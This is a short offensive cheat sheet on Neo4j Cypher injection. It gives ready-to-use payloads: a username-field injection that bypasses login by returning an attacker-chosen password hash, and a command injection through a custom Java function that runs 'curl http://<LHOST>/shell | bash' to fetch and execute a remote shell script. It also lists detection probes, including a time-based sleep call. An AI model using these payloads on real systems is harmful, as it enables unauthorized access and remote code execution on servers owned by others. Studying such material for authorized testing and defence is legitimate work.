# Neo4j Cypher Injection

## Login Bypass

When a login form queries Neo4j directly, inject into the username field:

```
' OR true return "9948e7baab1783a947c469c4c61e9f4bcce559b0" AS hash;//
```

The returned string becomes the password hash the app compares against — set it to the SHA1 of any password you choose.

## Custom Java Function RCE

Some Neo4j deployments load custom Java extensions (`.jar` files in the plugins dir) that expose functions callable via Cypher. If a function does network lookups or executes system calls, inject through a query parameter:

```cypher
CALL custom.getUrlStatusCode("http://target.com; curl http://<LHOST>/shell | bash; ") YIELD statusCode RETURN statusCode
```

Confirm code execution with a ping/curl callback before injecting a reverse shell.

## Detection

```bash
# Error-based: single quote in field often returns "SyntaxError" or stack trace
# Time-based: inject CALL apoc.util.sleep(5000) and measure response delay
```
